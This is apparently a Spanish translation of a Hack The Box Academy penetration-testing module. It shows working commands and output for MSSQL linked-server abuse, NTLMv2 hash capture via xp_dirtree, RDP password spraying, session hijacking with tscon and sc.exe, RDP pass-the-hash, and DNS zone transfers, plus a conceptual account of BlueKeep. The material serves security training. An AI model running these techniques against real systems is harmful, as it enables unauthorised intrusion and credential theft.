**Nota:** Se recomienda correr `EXECUTE AS LOGIN` dentro del DB maestro, porque todos los usuarios, por defecto, tienen acceso a esa base de datos. Si un usuario al que intenta hacerse pasar no tiene acceso al DB al que se está conectando presentará un error. Intenta pasar al DB maestro usando `USE master`.

Ahora podemos ejecutar cualquier comando como sysadmin como el valor devuelto `1` indica. Para revertir la operación y volver a nuestro usuario anterior, podemos usar la instrucción Transact-SQL `REVERT`.

**Nota:** Si encontramos un usuario que no es sysadmin, aún podemos comprobar si el usuario tiene acceso a otras bases de datos o servidores vinculados.

---

## Comunicarse con Otras Bases de Datos con MSSQL

`MSSQL` tiene una opción de configuración llamada [servidores vinculados](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Los servidores vinculados normalmente están configurados para permitir que el motor de base de datos ejecute una instrucción Transact-SQL que incluye tablas en otra instancia de SQL Server u otro producto de base de datos como Oracle.

Si logramos obtener acceso a un servidor SQL Server con un servidor vinculado configurado, podemos movernos lateralmente a ese servidor de base de datos. Los administradores pueden configurar un servidor vinculado utilizando credenciales del servidor remoto. Si esas credenciales tienen privilegios de sysadmin, es posible que podamos ejecutar comandos en la instancia remota de SQL. Veamos cómo podemos identificar y ejecutar consultas en servidores vinculados.

#### Identificar servidores vinculados en MSSQL

  Atacar bases de datos SQL

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

Como podemos ver en la salida de la consulta, tenemos el nombre del servidor y la columna `isremote`, donde `1` means es un servidor remoto, y `0` es un servidor vinculado. Podemos ver [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) para más información.

A continuación, podemos intentar identificar al usuario utilizado para la conexión y sus privilegios. El [EJECUTAR](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) la instrucción se puede usar para enviar comandos de paso a servidores vinculados. Agregamos nuestro comando entre paréntesis y especificamos el servidor vinculado entre corchetes (`[ ]`).

  Atacar bases de datos SQL

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Nota:** Si necesitamos usar comillas en nuestra consulta al servidor vinculado, necesitamos usar comillas dobles simples para escapar de la cotización única. Para ejecutar múltiples comandos a la vez podemos dividirlos con un semi colon (;).

Como hemos visto, ahora podemos ejecutar consultas con privilegios de sysadmin en el servidor vinculado. Como `sysadmin`, controlamos la instancia de SQL Server. Podemos leer datos de cualquier base de datos o ejecutar comandos del sistema con `xp_cmdshell`. Esta sección cubrió algunas de las formas más comunes de atacar bases de datos SQL Server y MySQL durante los compromisos de pruebas de penetración. Existen otros métodos para atacar estos tipos de bases de datos, así como otros, tales como [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, etc [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), y [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) que se cubrirá en otros módulos. Vale la pena tomarse un tiempo para leer sobre estas tecnologías de bases de datos y algunas de las formas comunes de atacarlas también.


# Últimas Vulnerabilidades SQL

---

Esta vez vamos a discutir una vulnerabilidad que no tiene un CVE y no requiere un exploit directo. La sección anterior muestra que podemos obtener el `NTLMv2` hashes interactuando con el servidor MSSQL. Sin embargo, debemos mencionar nuevamente que este ataque es posible a través de una conexión directa al servidor MSSQL y aplicaciones web vulnerables. Sin embargo, solo nos centraremos en la variante más simple por el momento, a saber, la interacción directa.

---

## El Concepto del Ataque

Nos centraremos en la función de servidor MSSQL indocumentada llamada `xp_dirtree` por esta vulnerabilidad. Esta función se utiliza para ver el contenido de una carpeta específica (local o remota). Además, esta función proporciona algunos parámetros adicionales que se pueden especificar. Estos incluyen la profundidad, hasta dónde debe ir la función en la carpeta y la carpeta de destino real.

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

Lo interesante es que la función MSSQL `xp_dirtree` no es directamente una vulnerabilidad, pero aprovecha el mecanismo de autenticación de SMB. Cuando intentamos acceder a una carpeta compartida en la red con un host de Windows, este host de Windows envía automáticamente un `NTLMv2` hash para autenticación.

Este hash se puede usar de varias maneras contra el servidor MSSQL y otros hosts en la red corporativa. Esto incluye un ataque SMB Relay en el que "reproducimos" el hash para iniciar sesión en otros sistemas en los que la cuenta tiene privilegios de administrador local o `cracking` este hash en nuestro sistema local. El craqueo exitoso nos permitiría ver y usar la contraseña en texto claro. Un ataque exitoso de SMB Relay nos otorgaría derechos de administrador en otro host de la red, pero no necesariamente el host donde se originó el hash porque Microsoft parcheó una falla anterior que permitía que un SMB Relay volviera al host de origen. Sin embargo, posiblemente podríamos obtener administrador local a otro host y luego robar credenciales que podrían reutilizarse para obtener acceso de administrador local al sistema original desde donde se originó el hash NTLMv2.

#### Iniciación del Ataque

|**Paso**|**XP_DIRE**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|La fuente aquí es la entrada del usuario, que especifica la función y la carpeta compartida en la red.|`Source`|
|`2.`|El proceso debe garantizar que todos los contenidos de la carpeta especificada se muestren al usuario.|`Process`|
|`3.`|La ejecución de comandos del sistema en el servidor MSSQL requiere privilegios elevados con los que el servicio ejecuta los comandos.|`Privileges`|
|`4.`|El servicio SMB se utiliza como el destino al que se envía la información especificada.|`Destination`|

Esto es cuando el ciclo comienza de nuevo, pero esta vez para obtener el hash NTLMv2 del usuario del servicio MSSQL.

#### Robar El Hash

|**Paso**|**Robando el Hash**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|Aquí, el servicio SMB recibe la información sobre el pedido especificado a través del proceso anterior del servicio MSSQL.|`Source`|
|`6.`|Luego se procesan los datos y se consulta la carpeta especificada para el contenido.|`Process`|
|`7.`|El hash de autenticación asociado se usa en consecuencia ya que el usuario que ejecuta MSSQL consulta el servicio.|`Privileges`|
|`8.`|En este caso, el destino de la autenticación y la consulta es el host que controlamos y la carpeta compartida en la red.|`Destination`|

Finalmente, el hash es interceptado por herramientas como `Responder`, `WireShark`, o `TCPDump` y se nos muestra, que podemos tratar de usar para nuestros propósitos. Aparte de eso, hay muchas maneras diferentes de ejecutar comandos en MSSQL. Por ejemplo, otro método interesante sería ejecutar código Python en una consulta SQL. Podemos encontrar más sobre esto en el [documentación](https://docs.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15) de Microsoft. Sin embargo, esta y otras posibilidades de lo que podemos hacer con MSSQL se discutirán en otro módulo.


# Ataque RDP

---

[Protocolo de Escritorio Remoto (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) es un protocolo patentado desarrollado por Microsoft que proporciona a un usuario una interfaz gráfica para conectarse a otra computadora a través de una conexión de red. También es una de las herramientas de administración más populares, lo que permite a los administradores de sistemas controlar centralmente sus sistemas remotos con la misma funcionalidad que si estuvieran en el sitio. Además, los proveedores de servicios administrados (MSP) a menudo utilizan la herramienta para administrar cientos de redes y sistemas de clientes. Desafortunadamente, aunque RDP facilita enormemente la administración remota de sistemas de TI distribuidos, también crea otra puerta de enlace para los ataques.

Por defecto, RDP utiliza puerto `TCP/3389`. Usando `Nmap`, podemos identificar el servicio RDP disponible en el host de destino:

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

---

## Configuraciones erróneas

Dado que RDP toma las credenciales de usuario para la autenticación, un vector de ataque común contra el protocolo RDP es la adivinación de contraseñas. Aunque no es común, podríamos encontrar un servicio RDP sin contraseña si hay una configuración incorrecta.

Una advertencia sobre la adivinación de contraseñas contra instancias de Windows es que debe considerar la política de contraseñas del cliente. En muchos casos, una cuenta de usuario se bloqueará o deshabilitará después de un cierto número de intentos fallidos de inicio de sesión. En este caso, podemos realizar una técnica específica de adivinación de contraseñas llamada `Password Spraying`. Esta técnica funciona al intentar una sola contraseña para muchos nombres de usuario antes de probar otra contraseña, teniendo cuidado de evitar el bloqueo de la cuenta.

Usando el [Barra](https://github.com/galkan/crowbar) herramienta, podemos realizar un ataque de pulverización de contraseña contra el servicio RDP. Como ejemplo a continuación, la contraseña `password123` se probará con una lista de nombres de usuario en el `usernames.txt` archivo. El ataque encontró las credenciales válidas como `administrator` : `password123` en el host RDP objetivo.

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

#### Crowbar - RDP Spraying de contraseña

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

También podemos usar `Hydra` para realizar un ataque de pulverización de contraseña RDP.

#### Hydra - RDP Pulverización de Contraseña

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

Podemos RDP en el sistema de destino usando el `rdesktop` cliente o `xfreerdp` cliente con credenciales válidas.

#### Inicio de sesión RDP

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-7-2.png)

---

## Ataques Específicos del Protocolo

Imaginemos que obtenemos acceso a una máquina con éxito y tenemos una cuenta con privilegios de administrador local. Si un usuario está conectado a través de RDP a nuestra máquina comprometida, podemos secuestrar la sesión de escritorio remoto del usuario para escalar nuestros privilegios y hacerse pasar por la cuenta. En un entorno de Active Directory, esto podría resultar en que nos hagamos cargo de una cuenta de Administrador de dominio o promovamos nuestro acceso dentro del dominio.

#### Secuestro de Sesión RDP

Como se muestra en el ejemplo a continuación, iniciamos sesión como usuario `juurena` (UserID = 2) que tiene `Administrator` privilegios. Nuestro objetivo es secuestrar al usuario `lewen` (ID de usuario = 4), que también ha iniciado sesión a través de RDP.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)

Para hacerse pasar con éxito por un usuario sin su contraseña, necesitamos tener `SYSTEM` privilegios y usar Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binario que permite a los usuarios conectarse a otra sesión de escritorio. Funciona especificando cuál `SESSION ID` (`4` para el `lewen` sesión en nuestro ejemplo) nos gustaría conectarnos a qué nombre de sesión (`rdp-tcp#13`, que es nuestra sesión actual). Entonces, por ejemplo, el siguiente comando abrirá una nueva consola como se especifica `SESSION_ID` dentro de nuestra sesión actual de RDP:

  Ataque RDP

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Si tenemos privilegios de administrador local, podemos usar varios métodos para obtener `SYSTEM` privilegios, como [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) o [Mimikatz](https://github.com/gentilkiwi/mimikatz). Un truco simple es crear un servicio de Windows que, por defecto, se ejecutará como `Local System` y ejecutará cualquier binario con `SYSTEM` privilegios. Usaremos [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binario. Primero, especificamos el nombre del servicio (`sessionhijack`) y el `binpath`, que es el comando que queremos ejecutar. Una vez que ejecutamos el siguiente comando, un servicio llamado `sessionhijack` será creado.

  Ataque RDP

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png)

Para ejecutar el comando, podemos iniciar el `sessionhijack` servicio :

  Ataque RDP

```cmd-session
C:\htb> net start sessionhijack
```

Una vez iniciado el servicio, un nuevo terminal con el `lewen` aparecerá la sesión de usuario. Con esta nueva cuenta, podemos intentar descubrir qué tipo de privilegios tiene en la red, y tal vez tengamos suerte, y el usuario es miembro del grupo Help Desk con derechos de administrador para muchos hosts o incluso un Administrador de dominio.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)

_Nota: Este método ya no funciona en Server 2019._

---

## RDP Pass-the-Hash (PtH)

Es posible que deseemos acceder a aplicaciones o software instalado en el sistema Windows de un usuario que solo está disponible con acceso GUI durante una prueba de penetración. Si tenemos credenciales de texto sin formato para el usuario objetivo, no será un problema para RDP en el sistema. Sin embargo, ¿qué pasa si solo tenemos el hash NT del usuario obtenido de un ataque de dumping de credenciales como [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) base de datos, ¿y no pudimos descifrar el hash para revelar la contraseña de texto sin formato? En algunos casos, podemos realizar un ataque RDP PtH para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Hay algunas advertencias a este ataque:

- `Restricted Admin Mode`, que está deshabilitado de forma predeterminada, debe habilitarse en el host de destino; de lo contrario, se nos pedirá el siguiente error:

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Se puede hacer usando el siguiente comando:

#### Agregar la Clave de Registro de DesactivarAdmin Restringido

  Ataque RDP

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

Una vez que se agrega la clave del registro, podemos usar `xfreerdp` con la opción `/pth` para obtener acceso RDP:

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>

```

Si funciona, ahora iniciaremos sesión a través de RDP como usuario objetivo sin conocer su contraseña en texto claro.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)

Tenga en cuenta que esto no funcionará contra todos los sistemas Windows que encontremos, pero siempre vale la pena intentarlo en una situación en la que tengamos un hash NTLM, sepamos que el usuario tiene derechos RDP contra una máquina o conjunto de máquinas, y el acceso GUI nos beneficiaría de alguna manera para cumplir el objetivo de nuestra evaluación.


# Últimas Vulnerabilidades RDP

---

En 2019, se publicó una vulnerabilidad crítica en el RDP (`TCP/3389`) servicio que también condujo a la ejecución remota de código (`RCE`) con el identificador [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708). Esta vulnerabilidad se conoce como `BlueKeep`. No requiere acceso previo al sistema para explotar el servicio para nuestros propósitos. Sin embargo, la explotación de esta vulnerabilidad condujo y aún conduce a muchos ataques de malware o ransomware. Las grandes organizaciones, como los hospitales, cuyo software solo está diseñado para versiones y bibliotecas específicas, son particularmente vulnerables a tales ataques, ya que el mantenimiento de la infraestructura es costoso. Aquí, también, no entraremos en detalles minuciosos sobre esta vulnerabilidad, sino que mantendremos el enfoque en el concepto.

---

## El Concepto del Ataque

La vulnerabilidad también se basa, al igual que con SMB, en solicitudes manipuladas enviadas al servicio objetivo. Sin embargo, lo peligroso aquí es que la vulnerabilidad no requiere que se active la autenticación del usuario. En cambio, la vulnerabilidad se produce después de inicializar la conexión cuando se intercambian configuraciones básicas entre el cliente y el servidor. Esto se conoce como a [Uso-Después-Gratis](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) técnica que utiliza memoria liberada para ejecutar código arbitrario.

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

Este ataque implica muchos pasos diferentes en el núcleo del sistema operativo, que no son de gran importancia aquí por el momento para entender el concepto detrás de él. Después de que la función ha sido explotada y la memoria ha sido liberada, los datos se escriben en el núcleo, lo que nos permite sobrescribir la memoria del núcleo. Esta memoria se utiliza para escribir nuestras instrucciones en la memoria liberada y dejar que la CPU las ejecute. Si queremos ver el análisis técnico de la vulnerabilidad BlueKeep, esto [artículo](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) proporciona una buena visión general.

#### Iniciación del Ataque

|**Paso**|**BlueKeep**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|Aquí, la fuente es la solicitud de inicialización del intercambio de configuraciones entre el servidor y el cliente que el atacante ha manipulado.|`Source`|
|`2.`|La solicitud conduce a una función utilizada para crear un canal virtual que contiene la vulnerabilidad.|`Process`|
|`3.`|Dado que este servicio es adecuado para [administración](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) del sistema, se ejecuta automáticamente con el [Cuenta LocalSystem](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) privilegios del sistema.|`Privileges`|
|`4.`|La manipulación de la función nos redirige a un proceso del kernel.|`Destination`|

Esto es cuando el ciclo comienza de nuevo, pero esta vez para obtener acceso remoto al sistema de destino.

#### Ejecución Remota de Código de Disparador

|**Paso**|**BlueKeep**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|La fuente esta vez es la carga útil creada por el atacante que se inserta en el proceso para liberar la memoria en el núcleo y colocar nuestras instrucciones.|`Source`|
|`6.`|El proceso en el kernel se activa para liberar la memoria del kernel y dejar que la CPU apunte a nuestro código.|`Process`|
|`7.`|Dado que el kernel también se ejecuta con los privilegios más altos posibles, las instrucciones que ponemos en la memoria del kernel liberada aquí también se ejecutan con [Cuenta LocalSystem](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) privilegios.|`Privileges`|
|`8.`|Con la ejecución de nuestras instrucciones desde el kernel, se envía un shell inverso a través de la red a nuestro host.|`Destination`|

No todas las variantes más nuevas de Windows son vulnerables a Bluekeep, según Microsoft. Las actualizaciones de seguridad para las versiones actuales de Windows están disponibles, y Microsoft también ha proporcionado actualizaciones para muchas versiones anteriores de Windows que ya no son compatibles. Sin embargo, `950,000` Los sistemas Windows fueron identificados como vulnerables a `Bluekeep` ataques en un escaneo inicial en mayo de 2019, e incluso hoy, sobre `a quarter` de esos anfitriones siguen siendo vulnerables.

Nota: Esta es una falla con la que probablemente nos encontraremos durante nuestras pruebas de penetración, pero puede causar inestabilidad del sistema, incluida una "pantalla azul de muerte (BSoD)," y debemos tener cuidado antes de usar el exploit asociado. En caso de duda, es mejor hablar primero con nuestro cliente para que entienda los riesgos y luego decida si le gustaría que ejecutáramos el exploit o no.


# Atacar DNS

---

El [Sistema de Nombres de Dominio](https://www.cloudflare.com/learning/dns/what-is-dns/) (`DNS`) traduce nombres de dominio (por ejemplo, hackthebox.com) a las direcciones IP numéricas (por ejemplo, 104.17.42.72). DNS es principalmente `UDP/53`, pero DNS confiará en `TCP/53` más a medida que avanza el tiempo. DNS siempre ha sido diseñado para usar tanto el puerto UDP como el TCP 53 desde el principio, siendo UDP el predeterminado, y vuelve a usar TCP cuando no puede comunicarse en UDP, generalmente cuando el tamaño del paquete es demasiado grande para avanzar en un solo paquete UDP. Dado que casi todas las aplicaciones de red utilizan DNS, los ataques contra servidores DNS representan una de las amenazas más frecuentes y significativas en la actualidad.

---

## Enumeración

DNS contiene información interesante para una organización. Como se discute en la sección Información de Dominio en el [Módulo de huella](https://academy.hackthebox.com/course/preview/footprinting)podemos entender cómo opera una empresa y los servicios que brindan, así como proveedores de servicios externos como correos electrónicos.

El Nmap `-sC` (scripts predeterminados) y `-sV` (version scan) opciones se pueden utilizar para realizar la enumeración inicial contra los servidores DNS de destino:

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
Nmap scan report for 10.10.110.213
Host is up (0.017s latency).

PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

---

## Transferencia de Zona DNS

Una zona DNS es una parte del espacio de nombres DNS que administra una organización o administrador específico. Dado que DNS comprende múltiples zonas DNS, los servidores DNS utilizan transferencias de zona DNS para copiar una parte de su base de datos a otro servidor DNS. A menos que un servidor DNS esté configurado correctamente (limitando qué IP pueden realizar una transferencia de zona DNS), cualquiera puede solicitar a un servidor DNS una copia de su información de zona, ya que las transferencias de zona DNS no requieren autenticación. Además, el servicio DNS generalmente se ejecuta en un puerto UDP; sin embargo, al realizar la transferencia de zona DNS, utiliza un puerto TCP para una transmisión de datos confiable.

Un atacante podría aprovechar esta vulnerabilidad de transferencia de zona DNS para obtener más información sobre el espacio de nombres DNS de la organización de destino, lo que aumentaría la superficie de ataque. Para la explotación, podemos usar el `dig` utilidad con tipo de consulta DNS `AXFR` opción para volcar los espacios de nombres DNS completos desde un servidor DNS vulnerable:

#### DIG - AXFR Transferencia de zona

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

Herramientas como [Feroz](https://github.com/mschwager/fierce) también se puede utilizar para enumerar todos los servidores DNS del dominio raíz y buscar una transferencia de zona DNS:

  Atacar DNS

```shell-session
vcrdcr@htb[/htb]# fierce --domain zonetransfer.me

NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
               '172800 900 1209600 3600\n'
               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"\n'
               '@ 301 IN TXT '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n'
               '@ 7200 IN A 5.196.105.14\n'
               '@ 7200 IN NS nsztm1.digi.ninja.\n'
               '@ 7200 IN NS nsztm2.digi.ninja.',
 <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',
 <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '
                                       'www',
 <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',
 <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',
 <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',
 <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',
 <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
 <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
                     'DNS changes"',
 <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',
 <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',
 <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',
 <DNS name DZC>: 'DZC 7200 IN TXT "AbCdEfG"',
 <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email 7200 IN A 74.125.206.26',
 <DNS name Hello>: 'Hello 7200 IN TXT "Hi to Josh and all his class"',
 <DNS name home>: 'home 7200 IN A 127.0.0.1',
 <DNS name Info>: 'Info 7200 IN TXT "ZoneTransfer.me service provided by Robin '
                  'Wood - robin@digi.ninja. See '
                  'http://digi.ninja/projects/zonetransferme.php for more '
                  'information."',
 <DNS name internal>: 'internal 300 IN NS intns1\ninternal 300 IN NS intns2',
 <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',
 <DNS name intns2>: 'intns2 300 IN A 167.88.42.94',
 <DNS name office>: 'office 7200 IN A 4.23.39.254',
 <DNS name ipv6actnow.org>: 'ipv6actnow.org 7200 IN AAAA '
                            '2001:67c:2e8:11::c100:1332',
...SNIP...
```

---

## Adquisiciones de Dominio y Enumeración de Subdominios

